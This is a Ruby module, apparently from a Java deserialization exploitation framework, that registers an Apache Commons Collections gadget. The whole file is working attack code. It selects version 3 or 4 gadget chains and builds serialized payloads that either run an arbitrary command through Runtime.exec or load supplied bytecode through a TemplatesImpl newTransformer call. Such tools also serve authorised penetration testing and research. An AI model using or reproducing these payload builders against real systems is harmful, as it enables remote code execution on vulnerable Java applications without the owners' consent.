

require_relative '../payloads/collections'
require_relative '../payloads/templates'

class Collections < Java::Gadgets::Gadget
  def id
    'collections'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('collections')

    unless params.fetch('classfiles', nil).nil?
      return false unless Java::Serialize::Payloads::Templates.supported(ctx)
    end

    true
  end

  def targets
    %w[exec bytecode]
  end

  def create(ctx, params: {})
    ver = 3
    if ctx.flag?('collections4') || ctx.class?('org.apache.commons.collections4.functors.InvokerTransformer')
      ver = 4
      ctx.reg.load('model/collections-4.json')
    else
      ctx.reg.load('model/collections-3.json')
    end

    if !params.fetch('cmd', nil).nil?
      Java::Serialize::Payloads::Collections.make_runtime_exec(params['cmd'], ver = ver)
    elsif !params.fetch('classfiles', nil).nil?
      tpl = Java::Serialize::Payloads::Templates.make_jdk(params['classfiles'])
      Java::Serialize::Payloads::Collections.make_invoke_noarg(tpl, 'newTransformer', ver = ver)
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  Collections.new
)
